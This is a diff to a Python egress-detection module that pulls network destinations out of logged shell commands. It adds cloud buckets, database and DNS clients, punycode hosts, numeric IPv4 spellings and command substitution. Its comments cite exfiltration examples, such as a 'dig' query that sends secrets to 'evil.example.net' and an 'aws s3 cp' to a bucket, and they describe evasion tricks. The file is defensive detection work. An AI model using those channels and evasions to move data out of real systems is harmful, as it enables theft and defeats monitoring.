@@ -125,18 +125,69 @@ TRUNCATED_SEGMENTS = "segments"      # more commands on one line than MAX_SHELL_
 TRUNCATION_REASONS = (TRUNCATED_DOMAINS, TRUNCATED_STRINGS, TRUNCATED_STRING, TRUNCATED_DEPTH,
                       TRUNCATED_SEGMENTS)
 
-#: A scheme, then either a bracketed IPv6 literal or a run of characters that a
-#: hostname may hold. The backtick is excluded with the quotes: a host never
+#: Every scheme whose authority names somewhere data can go. Reading only
+#: ``http`` and friends meant a session could copy a file to ``s3://bucket/k``,
+#: stream a table to ``postgres://db.example.net/x`` or push to
+#: ``redis://cache.example.net`` and reach, as far as this tool was concerned,
+#: nobody at all. Object storage, databases, queues, directories and remote
+#: shells are destinations like any other.
+URL_SCHEMES = (
+    "https", "http", "wss", "ws", "ftps", "ftp",                       # the web
+    "s3", "gs", "azure", "abfss", "abfs", "wasbs", "wasb",             # object storage
+    "smb", "ssh", "sftp", "scp", "rsync", "tftp",                      # files and shells
+    "rediss", "redis", "postgresql", "postgres", "mysql",              # databases
+    "mongodb+srv", "mongodb",
+    "amqps", "amqp", "mqtt", "ldaps", "ldap",                          # queues and directories
+)
+
+#: Schemes whose authority is a **bucket**, not a host: ``s3://logs-eu/key``
+#: names a bucket called ``logs-eu`` at whichever endpoint the client is
+#: configured for, and there is no DNS name in the URL to record. Those are
+#: kept as ``s3:logs-eu`` and ``gs:logs-eu`` — a form that cannot be mistaken
+#: for a host name, matches the operator's patterns like one, and is of unknown
+#: region, because a bucket name says nothing about where the bucket is.
+BUCKET_SCHEMES = ("s3", "gs")
+
+#: The same convention for a remote configured outside the log: ``rclone copy f
+#: remote:bucket`` names ``remote``, whose endpoint lives in rclone's own
+#: configuration file and not in anything a session records.
+REMOTE_PREFIX = "rclone"
+
+#: A destination that is not a DNS name, written ``<kind>:<name>``. Matched by
+#: a pattern exactly, or by ``<kind>:*`` for every one of its kind.
+NON_DNS_KINDS = (*BUCKET_SCHEMES, REMOTE_PREFIX)
+_NON_DNS = re.compile(r"^(?:" + "|".join(re.escape(kind) for kind in NON_DNS_KINDS)
+                      + r"):[a-z0-9][a-z0-9._-]{0,62}$", re.IGNORECASE)
+
+#: A scheme shape, then either a bracketed IPv6 literal or a run of characters
+#: that a hostname may hold. The backtick is excluded with the quotes: a host never
 #: contains one, and a URL at the end of a markdown span is followed by one.
-_URL = re.compile(r"(?:https?|wss?|ftps?)://"
+#: Non-ASCII characters are *not* excluded: an internationalised host arrives
+#: in Unicode and is converted to punycode by :func:`host_shape`.
+#: The declared schemes as a set, and the longest one, which bounds the pattern.
+#: The pattern matches the *shape* of a scheme and the set decides whether it is
+#: one: a 27-way alternation was tried at every position of every string holding
+#: a ``://`` and cost 14% on a nine-megabyte session, while a character class
+#: costs what one alternative did and the set lookup runs only on a match.
+_SCHEME_SET = frozenset(URL_SCHEMES)
+_SCHEME_MAX = max(len(scheme) for scheme in URL_SCHEMES)
+
+#: The guard before the scheme is what keeps ``logs://x`` from being read as the
+#: scheme ``gs``: a scheme never follows a word character.
+_URL = re.compile(rf"(?<![A-Za-z0-9+.-])(?P<scheme>[a-z][a-z0-9+.-]{{1,{_SCHEME_MAX - 1}}})://"
                   r"(?P<host>\[[0-9A-Fa-f:.]{2,45}\]|[^\s/?#\\\"'`<>()\[\]{},;]+)",
                   re.IGNORECASE)
 _IPV4 = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
 _IPV6 = re.compile(r"^\[[0-9A-Fa-f:.]{2,45}\]$")
+
+#: A dotted name whose last label is either letters (``com``, ``example``) or a
+#: punycode tag (``xn--p1ai``, the ASCII form of ``рф``). Without the second
+#: alternative every internationalised domain was read as "not a host", which
+#: made an IDN a free way out: ``https://collector.xn--p1ai/x`` reached nobody.
 _HOST = re.compile(r"""
     ^(?=.{1,253}$)                      # a hostname is at most 253 characters
     (?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+   # one or more labels, each ending in alphanumeric
-    [a-z]{2,63}$                        # a letters-only public suffix
+    (?:[a-z]{2,63}|xn--[a-z0-9-]{1,59})$          # a letters-only or punycode public suffix
 """, re.IGNORECASE | re.VERBOSE)
 
 #: Punctuation that prose and markdown put around a URL and a hostname never
@@ -187,12 +238,18 @@ class _Scan:
 def normalise_host(raw: str | None) -> str | None:
     """A URL's authority as a bare host: no credentials, no port, lowercase.
 
-    ``"User:pw@API.OpenAI.com:443."`` becomes ``"api.openai.com"``. An IPv6
+    ``"User:pw@API.OpenAI.com:443."`` becomes ``"api.openai.com"``, and a
+    Unicode host its punycode form (``"collector.рф"`` →
+    ``"collector.xn--p1ai"``), so that both spellings of one destination are
+    one entry and one pattern covers them. An IPv6
     literal keeps its brackets (``"[::1]"``), since that is what distinguishes
     it from a port. Returns None when nothing usable is left.
     """
     if not isinstance(raw, str):
         return None
+    non_dns = is_non_dns_destination(raw)
+    if non_dns:
+        return non_dns                                        # s3:bucket — no port to drop, no case to fold
     host = raw.strip().strip("\"'").split("@")[-1]           # drop any userinfo
     if host.startswith("["):                                  # IPv6 literal: [::1]:8080
         end = host.find("]")
@@ -201,29 +258,139 @@ def normalise_host(raw: str | None) -> str | None:
         host = host.split(":")[0]                             # drop the port
         host = host.strip(_TRAILING)                          # markdown and prose, not a hostname
     host = host.rstrip(".").lower()
+    if host and not host.isascii():
+        host = punycode(host)                                 # one destination, one spelling
     return host or None
+
+
+def punycode(host: str) -> str:
+    """An internationalised host in its ASCII form; the input unchanged if it will not convert.
+
+    ``collector.рф`` becomes ``collector.xn--p1ai``. The standard library's
+    ``idna`` codec does the work, and **never raises here**: a label that is
+    too long, empty or otherwise impossible comes back as it went in, and then
+    fails the shape test like any other non-host. Nothing is resolved — this is
+    a string transformation, defined by a table.
+
+    The punycode form is the one kept, so that a destination written in Cyrillic
+    and the same destination written in ASCII are one entry, comparable to one
+    pattern.
+    """
+    try:
+        return host.encode("idna").decode("ascii")
+    except (UnicodeError, UnicodeDecodeError, ValueError):
+        return host
+
+
+def _ipv4_part(text: str) -> int | None:
+    """One part of an address, decimal, octal (``0177``) or hexadecimal (``0x7f``)."""
+    if not text:
+        return None
+    try:
+        lowered = text.lower()
+        if lowered.startswith(("0x", "-0x", "+0x")):
+            return int(lowered, 16)
+        if lowered.startswith("0") and lowered != "0" and lowered.isdigit():
+            return int(lowered, 8)
+        return int(lowered, 10) if lowered.isdigit() else None
+    except ValueError:
+        return None
+
+
+def canonical_ipv4(text: str | None) -> str | None:
+    """An address written any of the ways a C library accepts, as dotted quad, or None.
+
+    ``2130706433``, ``0x7f000001``, ``0177.0.0.1`` and ``127.1`` all name
+    127.0.0.1, because ``inet_aton`` reads an address as one to four parts in
+    any base, the last part covering the octets left over. Every browser, every
+    ``curl`` and every socket library follows it, so ``curl http://2130706433/``
+    reaches a host — and read as a name it reached nobody, which made four
+    spellings of one address a way out.
+
+    The canonical form is what comes back, so the four spellings are one
+    destination and compare against one pattern.
+
+    A form with fewer than four parts is refused when its first octet would be
+    zero, which is what keeps a port number or a version string from becoming
+    an address: ``9000`` (``nc host 9000``) would be 0.0.35.40, and is not read
+    as anything.
+    """
+    if not text or not text[0].isdigit():
+        return None
+    parts = text.split(".")
+    if len(parts) > 4:
+        return None
+    values = []
+    for part in parts:
+        value = _ipv4_part(part)
+        if value is None or value < 0:
+            return None
+        values.append(value)
+    *head, last = values
+    if any(value > 255 for value in head):
+        return None
+    span = 4 - len(head)
+    if last >= 1 << (8 * span):
+        return None
+    number = 0
+    for value in head:
+        number = (number << 8) | value
+    number = (number << (8 * span)) | last
+    if len(parts) < 4 and number < 1 << 24:
+        return None                       # a small integer is a port or a count, not an address
+    return ".".join(str((number >> shift) & 0xFF) for shift in (24, 16, 8, 0))
+
+
+def is_non_dns_destination(value: str | None) -> str | None:
+    """``"s3:logs-eu"`` as itself, when it is one of the non-DNS forms; else None.
+
+    A bucket or a configured remote (:data:`NON_DNS_KINDS`) is a destination
+    without a host name. Keeping it in a shape no host can have is what lets it
+    travel through the same baseline, the same patterns and the same report
+    without ever being mistaken for a resolvable name.
+    """
+    if not value or not isinstance(value, str):
+        return None
+    text = value.strip().strip("\"'").rstrip("/")
+    return text.lower() if _NON_DNS.match(text) else None
 
 
 def host_shape(host: str | None) -> str | None:
     """``host`` when it is shaped like one, else None. One notion, used everywhere.
 
-    A destination is a dotted name with a letters-only suffix
-    (``api.openai.com``), an address literal (``1.2.3.4``, ``[::1]``), or
-    ``localhost``. Anything else is a word that happened to follow ``://``:
-    ``a``, ``api``, ``r``, ``h%d.example.net``, ``x`` with a backtick on it.
-    Those are what a URL search used to hand over as destinations, because the
-    shape test was applied to bare values only — one rule for a field that
-    names a host and none at all for a URL.
+    A destination is a dotted name with a letters-only or punycode suffix
+    (``api.openai.com``, ``collector.xn--p1ai``), an address literal
+    (``1.2.3.4``, ``[::1]``, and the numeric spellings of one), ``localhost``,
+    or one of the non-DNS forms (``s3:bucket``). Anything else is a word that
+    happened to follow ``://``: ``a``, ``api``, ``r``, ``h%d.example.net``,
+    ``x`` with a backtick on it.
+
+    Two normalisations happen here, and both mean the value **changes** on its
+    way through: a Unicode host becomes punycode, and a numeric address becomes
+    a dotted quad. One destination, one spelling, one thing to compare against
+    a pattern.
 
     Nothing is resolved here either: the shape is the only thing checked.
     """
     if not host:
         return None
+    # The ordinary case first and in one regex: a dotted name costs exactly what
+    # it cost before any of the forms below were read. None of them can match
+    # _HOST — a colon, a bracket and a digits-only suffix all fail it — so
+    # checking it first changes no answer.
+    if host.isascii() and _HOST.match(host):
+        return host
     if host.startswith("["):
         return host if _IPV6.match(host) else None
+    non_dns = is_non_dns_destination(host)
+    if non_dns:
+        return non_dns
+    if not host.isascii():
+        host = punycode(host).lower()
+        return host if _HOST.match(host) else None
     if host == _LOCALHOST or _IPV4.match(host):
         return host
-    return host if _HOST.match(host) else None
+    return canonical_ipv4(host)
 
 
 def domains_in_text(text: str, scan: _Scan | None = None) -> set[str]:
@@ -251,7 +418,17 @@ def domains_in_text(text: str, scan: _Scan | None = None) -> set[str]:
         return set()
     found = set()
     for m in _URL.finditer(text):
-        host = host_shape(normalise_host(m.group("host")))
+        scheme = m.group("scheme").lower()
+        if scheme not in _SCHEME_SET:
+            continue                    # a "://" after some other word: not a destination
+        authority = m.group("host")
+        if scheme in BUCKET_SCHEMES:
+            # s3://logs-eu/key names a bucket, not a host. See BUCKET_SCHEMES.
+            bucket = is_non_dns_destination(f"{scheme}:{authority.split('/')[0]}")
+            if bucket:
+                found.add(bucket)
+            continue
+        host = host_shape(normalise_host(authority))
         if host:
             found.add(host)
     return found
@@ -260,6 +437,13 @@ def domains_in_text(text: str, scan: _Scan | None = None) -> set[str]:
 #: Final labels that make a dotted word a filename rather than a host. A
 #: network-named field is unlikely to hold one, but "notes.txt" and "data.csv"
 #: are valid hostnames by shape, and reporting them as egress would be noise.
+#:
+#: :data:`NOT_HOSTS_CHECKED` records the day the whole list was last checked
+#: against the DNS root. **Re-check it at every new ICANN gTLD round**, and at
+#: every edit: a label that becomes a top-level domain turns this filter into an
+#: egress hole, silently. The test that pins the list fails if it changes
+#: without that date changing, which is the only way a list like this stays
+#: true.
 #:
 #: **Every entry here has to be absent from the DNS root**, because a label
 #: that is both a file extension and a delegated TLD makes this filter an
@@ -270,6 +454,10 @@ def domains_in_text(text: str, scan: _Scan | None = None) -> set[str]:
 #: (Moldova), ``py`` (Paraguay) and ``rs`` (Serbia) — and the rest of the list
 #: was checked against the root zone. Check any addition the same way: if
 #: ``https://<label>`` could resolve for somebody, it does not belong here.
+#: The day :data:`NOT_HOSTS` was last checked, label by label, against the DNS
+#: root zone (https://data.iana.org/TLD/tlds-alpha-by-domain.txt).
+NOT_HOSTS_CHECKED = "2026-11-24"
+
 NOT_HOSTS = frozenset({
     "txt", "json", "jsonl", "csv", "tsv", "yml", "yaml", "toml", "ini", "cfg", "conf", "env",
     "log", "lock", "xml", "html", "htm", "css", "js", "jsx", "ts", "tsx", "pyc", "rb",
@@ -317,10 +505,45 @@ SHELL_KEYS = frozenset({
 NETWORK_COMMANDS = frozenset({
     "curl", "wget", "http", "https", "httpie",           # http/https are the httpie entry points
     "nc", "ncat", "netcat", "socat", "telnet",
-    "ssh", "scp", "sftp", "rsync", "ftp",
+    "ssh", "scp", "sftp", "rsync", "ftp", "tftp", "smbclient",
     "git",                                               # network subcommands only; see GIT_NETWORK_SUBCOMMANDS
     "invoke-webrequest", "invoke-restmethod", "iwr", "irm", "test-netconnection",
+    # Object storage and cloud CLIs: the destination is a bucket or an endpoint,
+    # and `aws s3 cp f s3://bucket/k` is the shortest exfiltration path there is.
+    "aws", "gcloud", "gsutil", "az", "azcopy", "rclone", "mc", "s3cmd", "kubectl",
+    # Resolvers. The *queried name* is the destination: a name is a message,
+    # and `dig secret.evil.example.net` sends it to whoever runs that zone.
+    "dig", "nslookup", "host", "drill",
+    # Databases, caches and raw TLS.
+    "psql", "mysql", "mysqldump", "redis-cli", "mongosh", "mongo", "mongodump", "openssl",
 })
+
+#: Clients whose **positional argument is the name being queried**, which is
+#: what makes DNS an exfiltration channel: no payload leaves, the question is
+#: the payload. ``dig secret-data.evil.example.net`` tells that zone's operator
+#: the secret, and the only trace is a lookup.
+_RESOLVER_COMMANDS = frozenset({"dig", "nslookup", "host", "drill"})
+
+#: ``dig`` and ``drill`` take the server to ask as ``@server``.
+_AT_SERVER = frozenset({"dig", "drill"})
+
+#: Clients whose positional argument is a UNC path, ``//server/share``: the
+#: first component is the host, and there is no scheme to find it by.
+_UNC_CLIENTS = frozenset({"smbclient"})
+
+#: Clients whose positional argument is a ``remote:path`` configured elsewhere
+#: (:data:`REMOTE_PREFIX`): the endpoint is in rclone's own configuration file,
+#: so the remote's *name* is the most that can be recorded.
+_REMOTE_CLIENTS = frozenset({"rclone"})
+
+#: Cloud CLIs: nothing positional is a host, so only their endpoint options and
+#: the URLs in their arguments count. ``aws --version`` and ``kubectl get pods``
+#: name no destination and produce none.
+_CLOUD_CLIENTS = frozenset({"aws", "gcloud", "gsutil", "az", "azcopy", "mc", "s3cmd", "kubectl"})
+
+#: Database clients: the host is an option (``-h``), never a positional (which
+#: is a database name, a user or a file).
+_DB_CLIENTS = frozenset({"psql", "mysql", "mysqldump", "redis-cli", "mongosh", "mongo", "mongodump"})
 
 #: ``git`` subcommands that contact a remote. ``git commit -m "see example.com"``
 #: and ``git grep http://x`` must give nothing, so the subcommand is checked
@@ -402,6 +625,12 @@ _DEST_OPTIONS = {
     "--socks4": None, "--socks4a": None, "--socks5": None, "--socks5-hostname": None,
     "--resolve": None, "--connect-to": None, "--dns-servers": None,
     "-J": frozenset({"ssh", "scp", "sftp"}),             # ssh jump host
+    # Cloud and database clients name their destination in an option.
+    "--endpoint-url": _CLOUD_CLIENTS, "--endpoint": _CLOUD_CLIENTS,
+    "--server": _CLOUD_CLIENTS, "-s": frozenset({"kubectl"}),
+    "--host-base": frozenset({"s3cmd"}), "--host": _DB_CLIENTS | _CLOUD_CLIENTS,
+    "-h": _DB_CLIENTS, "-connect": frozenset({"openssl"}), "--connect": frozenset({"openssl"}),
+    "-L": frozenset({"smbclient"}),                      # smbclient -L host: list that host's shares
     "-uri": _PS_COMMANDS, "-proxy": _PS_COMMANDS, "-computername": _PS_COMMANDS,
 }
 
@@ -419,20 +648,22 @@ _VALUE_OPTIONS = {
     "--upload-file": None, "--config": None, "--cacert": None, "--capath": None,
     "--cert": None, "--key": None, "--max-time": None, "--connect-timeout": None,
     "--retry": None, "--limit-rate": None, "--output": None, "--range": None,
-    "-o": _HTTP_CLIENTS | _SSH_CLIENTS | {"git"}, "-d": _HTTP_CLIENTS, "-H": _HTTP_CLIENTS, "-F": _HTTP_CLIENTS | _SSH_CLIENTS,
-    "-u": _HTTP_CLIENTS, "-X": _HTTP_CLIENTS, "-A": _HTTP_CLIENTS, "-b": _HTTP_CLIENTS | {"ssh"},
+    "-o": _HTTP_CLIENTS | _SSH_CLIENTS | {"git"},
+    "-d": _HTTP_CLIENTS | _DB_CLIENTS, "-H": _HTTP_CLIENTS, "-F": _HTTP_CLIENTS | _SSH_CLIENTS,
+    "-u": _HTTP_CLIENTS | {"mongosh", "mongo", "mongodump"}, "-X": _HTTP_CLIENTS, "-A": _HTTP_CLIENTS, "-b": _HTTP_CLIENTS | {"ssh"},
     "-c": _HTTP_CLIENTS | {"ssh"}, "-e": _HTTP_CLIENTS | {"rsync"},
     "-w": _HTTP_CLIENTS | {"nc", "ncat", "netcat"},
     "-T": _HTTP_CLIENTS, "-K": _HTTP_CLIENTS, "-m": _HTTP_CLIENTS | {"ssh"}, "-r": _HTTP_CLIENTS,
     "-y": _HTTP_CLIENTS, "-Y": _HTTP_CLIENTS, "-z": _HTTP_CLIENTS,
     # wget
     "-O": frozenset({"wget"}), "--output-document": frozenset({"wget"}),
-    "-P": frozenset({"wget"}), "--directory-prefix": frozenset({"wget"}),
+    "-P": frozenset({"wget"}) | _DB_CLIENTS, "--directory-prefix": frozenset({"wget"}),
     "--input-file": frozenset({"wget"}), "-a": frozenset({"wget"}),
     "--output-file": frozenset({"wget"}), "--post-data": frozenset({"wget"}),
     "--post-file": frozenset({"wget"}), "-t": frozenset({"wget"}),
     # ssh, scp, sftp: identity, port, login name, config, forwardings
-    "-i": _SSH_CLIENTS | {"wget"}, "-p": _SSH_CLIENTS | {"nc", "ncat", "netcat"},
+    "-i": _SSH_CLIENTS | {"wget"},
+    "-p": _SSH_CLIENTS | _DB_CLIENTS | {"nc", "ncat", "netcat"},
     "-l": frozenset({"ssh", "nc", "ncat", "netcat"}), "-S": _SSH_CLIENTS,
     "-L": frozenset({"ssh"}), "-R": frozenset({"ssh"}), "-D": frozenset({"ssh"}),
     "-W": frozenset({"ssh"}), "-E": frozenset({"ssh"}), "-I": _SSH_CLIENTS, "-B": _SSH_CLIENTS,
@@ -449,6 +680,18 @@ _VALUE_OPTIONS = {
     "--depth": frozenset({"git"}), "--origin": frozenset({"git"}), "--branch": frozenset({"git"}),
     "--reference": frozenset({"git"}), "--template": frozenset({"git"}),
     "--upload-pack": frozenset({"git"}), "--receive-pack": frozenset({"git"}),
+    # The new clients' options whose value is *not* a destination: a profile, a
+    # region name, a user, a database, a file. Listed so the value after them is
+    # not read as a positional argument.
+    "--profile": _CLOUD_CLIENTS, "--region": _CLOUD_CLIENTS,
+    "--project": _CLOUD_CLIENTS, "--namespace": frozenset({"kubectl"}),
+    "-n": frozenset({"kubectl"}), "--context": frozenset({"kubectl"}),
+    "--kubeconfig": frozenset({"kubectl"}), "-f": frozenset({"kubectl", "psql", "mysql"}),
+    "--db": _DB_CLIENTS, "-U": _DB_CLIENTS,
+    "--password": _DB_CLIENTS, "--port": _DB_CLIENTS,
+    "-type": frozenset({"dig", "drill"}), "-class": frozenset({"dig"}),
+    "-servname": frozenset({"openssl"}), "-cert": frozenset({"openssl"}),
+    "-key": frozenset({"openssl"}), "-CAfile": frozenset({"openssl"}),
     # PowerShell parameters whose value is a body, a header set or a local file
     "-method": _PS_COMMANDS, "-body": _PS_COMMANDS, "-headers": _PS_COMMANDS,
     "-outfile": _PS_COMMANDS, "-infile": _PS_COMMANDS, "-contenttype": _PS_COMMANDS,
@@ -497,6 +740,12 @@ _HAS_SEPARATOR = re.compile(r"[|;&\n\r]")
 #: A leading ``VAR=value``, which is an assignment and not the program.
 _ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
 
+#: A command substitution: ``$(…)`` or ``` `…` ``` . What is inside runs, and
+#: what runs can reach somewhere, so the contents are read as a command line of
+#: their own (one level, like every other nesting here).
+_SUBSTITUTION = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")
+
+
 #: Options are matched as a whole token; ``-``, ``--`` and ``-`` alone are not.
 _OPTION = re.compile(r"^-{1,2}[^\s-]")
 
@@ -544,13 +793,92 @@ def _destinations_in_arg(value: str, program: str, colon_fields: bool = False) -
     return found
 
 
+def punycode_pattern(pattern: str) -> str:
+    """``"*.рф"`` as ``"*.xn--p1ai"``: each label converted, the wildcard kept.
+
+    ``punycode`` cannot convert ``*`` as a label, so the conversion is per
+    label. A pattern the operator typed in Cyrillic has to match the
+    destination that was recorded in punycode, or the rule silently never
+    fires — which is the failure mode this whole module is about.
+    """
+    if pattern.isascii():
+        return pattern
+    return ".".join(label if label.isascii() else punycode(label)
+                    for label in pattern.split("."))
+
+
+def _bucket_or_url(token: str) -> set[str]:
+    """Destinations named by a URL inside one argument, bucket schemes included.
+
+    The one thing read from a cloud CLI's positional arguments: ``aws s3 cp f
+    s3://bucket/k`` names a bucket, and ``kubectl --server https://k8s/…``
+    names a host, while ``get pods`` and ``--region eu-west-1`` name nothing.
+    """
+    return domains_in_text(token)
+
+
+def _unc_host(token: str) -> set[str]:
+    """``"//files.example.net/share"`` as its host; nothing for anything else."""
+    text = token.strip().strip("\"'").replace("\\", "/")
+    if not text.startswith("//"):
+        return set()
+    host = host_shape(normalise_host(text[2:].split("/")[0]))
+    return {host} if host else set()
+
+
+def _remote_name(token: str) -> set[str]:
+    """``"remote:bucket/path"`` as ``{"rclone:remote"}``; nothing for a local path.
+
+    The endpoint behind an rclone remote is in its configuration file, not in
+    the command, so the remote's name is the most that can honestly be
+    recorded — and it is recorded, because "a file went to *some* remote" is
+    the finding, and a name an operator can match a pattern against is what
+    makes it actionable.
+    """
+    name, sep, _rest = token.partition(":")
+    if not sep or not name or "/" in name or "\\" in name:
+        return set()                              # a local path, or a Windows drive
+    found = is_non_dns_destination(f"{REMOTE_PREFIX}:{name}")
+    return {found} if found else set()
+
+
 def _bare_host(text: str) -> str | None:
     """``text`` up to its path as a host; :func:`host_shape` holds the brackets to IPv6."""
     return host_in_value(re.split(r"[/?#]", text, maxsplit=1)[0])
 
 
+def _might_hold_a_destination(text: str) -> bool:
+    """Could this unread text name somewhere? A scheme, or a known client.
+
+    The same two things the reader itself looks for: a URL (which the whole-text
+    rule has already seen, scheme and all) or a program whose arguments would be
+    read. Nothing else in a command line can produce a destination, so a
+    substitution holding neither could not have hidden one.
+    """
+    if "://" in text:
+        return True
+    lowered = text.lower()
+    return any(re.search(rf"(?<![\w.-]){re.escape(command)}(?![\w.-])", lowered)
+               for command in NETWORK_COMMANDS)
+
+
+def _substituted_commands(text: str):
+    """The command lines inside ``$(…)`` and ``` `…` ``` in ``text``."""
+    for match in _SUBSTITUTION.finditer(text):
+        inner = match.group(1) if match.group(1) is not None else match.group(2)
+        if inner and inner.strip():
+            yield inner
+
+
 def _strip_prefixes(tokens: list[str]) -> list[str]:
-    """``tokens`` without the wrappers and assignments in front of the program."""
+    """``tokens`` without the wrappers and assignments in front of the program.
+
+    An assignment is stripped whatever its value is, including a command
+    substitution: ``TOKEN=$(cat /tmp/t) curl api.example.net/v1`` has to reach
+    the ``curl``. The substituted command is read separately, by
+    :func:`_scan_command`, so ``X=$(curl host.example.net/x)`` — which has no
+    program after the assignment at all — is read too.
+    """
     i = 0
     while i < len(tokens):
         if _program_name(tokens[i]) in _PREFIX_COMMANDS:
@@ -655,6 +983,23 @@ def _hosts_in_segment(tokens: list[str], scan: _Scan, depth: int) -> None:
                 scan.data_bytes += _literal_data_bytes(option, value)
             if kind == "dest":
                 hosts = _destinations_in_arg(value, program, colon_fields=True)
+        elif program in _AT_SERVER and token.startswith("@") and len(token) > 1:
+            hosts = _destinations_in_arg(token[1:], program)      # dig @resolver
+        elif program in _CLOUD_CLIENTS:
+            # Nothing positional is a host here: a subcommand, a bucket URL, a
+            # resource name. Only the URLs in it count, and those are read by
+            # the URL rule that runs over every string anyway.
+            hosts = _bucket_or_url(token)
+        elif program in _REMOTE_CLIENTS:
+            hosts = _bucket_or_url(token) or _remote_name(token)
+        elif program in _UNC_CLIENTS:
+            hosts = _bucket_or_url(token) or _unc_host(token)
+        elif program in _RESOLVER_COMMANDS:
+            # The queried name. A resolver has no other positional worth
+            # reading, and `dig +short` and `-t AAAA` are options.
+            hosts = _destinations_in_arg(token, program) if not token.startswith("+") else set()
+        elif program in _DB_CLIENTS:
+            hosts = _bucket_or_url(token)                         # a connection string, if anything
         else:
             if program in _HTTPIE and "=" in token:
                 # httpie takes its body as key=value pairs: "name=x" is data.
@@ -683,7 +1028,11 @@ def domains_in_command(command: str, budget: list[int] | None = None) -> set[str
 
     A command *inside* a command is read one level deep
     (:data:`MAX_SHELL_DEPTH`): the value of ``bash -c`` and friends
-    (:data:`_SHELL_WRAPPERS`), and the remote command of ``ssh host <command>``.
+    (:data:`_SHELL_WRAPPERS`), the remote command of ``ssh host <command>``,
+    and a command substitution — ``$(…)`` or backticks — wherever it appears,
+    including as the value of an assignment (``X=$(curl host.example.net/x)``).
+    A substitution is then removed from the line that held it, because it is a
+    command of its own and not a token of that line.
     The inner program is judged by exactly the same rule as the outer one, so
     ``bash -c "echo example.com"`` still gives nothing.
 
@@ -802,6 +1151,23 @@ def _scan_command(command: str, scan: _Scan, depth: int) -> None:
             return
         if not segment.strip():
             continue
+        if "$(" in segment or "`" in segment:
+            if depth < MAX_SHELL_DEPTH:
+                for inner in _substituted_commands(segment):
+                    _scan_command(inner, scan, depth + 1)
+            elif any(_might_hold_a_destination(inner)
+                     for inner in _substituted_commands(segment)):
+                # Too deep to read as a command, and it holds something that
+                # could be a destination: that is a bound reached, and a bound
+                # reached has to be reported. A substitution that holds neither
+                # a scheme nor a network client was read far enough to know
+                # there is nothing in it, so it is not reported — `ssh host
+                # 'GATE=$(sbatch ...)'` is an everyday line, and crying wolf on
+                # it is how a truncation flag stops being read at all.
+                scan.note(TRUNCATED_DEPTH)
+            # Whatever the substitution was, it is not part of the line around
+            # it: blanking it is what lets the program after it be found.
+            segment = _SUBSTITUTION.sub(" ", segment)
         if len(segment) <= MAX_SHLEX_CHARS and scan.shlex_chars <= MAX_SHLEX_CHARS:
             scan.shlex_chars += len(segment)
             try:
@@ -1040,10 +1406,20 @@ def normalise_pattern(raw: str) -> str:
     (``.cn``, same thing) or a whole URL, whose host is taken. Raises
     ``ValueError`` naming what was expected — a pattern the operator cannot
     spell is worse than one they are told how to spell.
+
+    A non-DNS destination is written as it is recorded: ``s3:logs-eu``,
+    ``rclone:backup``, or ``s3:*`` for every bucket of that kind. There is no
+    ``*.`` wildcard for those — a bucket name has no subdomains.
     """
     text = (raw or "").strip().strip("\"'")
     if not text:
         raise ValueError("domain is empty")
+    non_dns = is_non_dns_destination(text)
+    if non_dns:
+        return non_dns                                   # s3:logs-eu, rclone:backup
+    kind, sep, rest = text.lower().partition(":")
+    if sep and rest == "*" and kind in NON_DNS_KINDS:
+        return f"{kind}:*"                               # every bucket, every remote of that kind
     if text in ("*", "*.", ".", "**"):
         raise ValueError(
             f"{raw!r} would match every host; there is no need for it — a domain that is not in the "
@@ -1067,6 +1443,9 @@ def normalise_pattern(raw: str) -> str:
 def domain_matches(domain: str, pattern: str) -> bool:
     """Does ``domain`` match ``pattern``?
 
+    A non-DNS destination (``s3:logs-eu``) matches itself and ``s3:*``, and
+    nothing else: a bucket name has no suffix to wildcard.
+
     ``api.openai.com`` matches only itself. ``*.cn`` matches any host ending in
     ``.cn`` — ``api.unknown.cn`` yes, ``cn`` no — and ``*.alibaba.com`` matches
     ``x.alibaba.com`` but **not** ``alibaba.com``: a wildcard covers
@@ -1076,7 +1455,13 @@ def domain_matches(domain: str, pattern: str) -> bool:
     host = normalise_host(domain)
     if not host:
         return False
-    pattern = (pattern or "").strip().lower().rstrip(".")
+    pattern = punycode_pattern((pattern or "").strip().lower().rstrip("."))
+    non_dns = is_non_dns_destination(host)
+    if non_dns:
+        # A bucket or a remote: itself, or every one of its kind. No suffix
+        # wildcard, because there is no hierarchy in a bucket name.
+        kind = non_dns.split(":", 1)[0]
+        return pattern in (non_dns, f"{kind}:*")
     if pattern.startswith("*."):
         return host.endswith(pattern[1:])        # "*.cn" -> endswith ".cn"
     return host == pattern
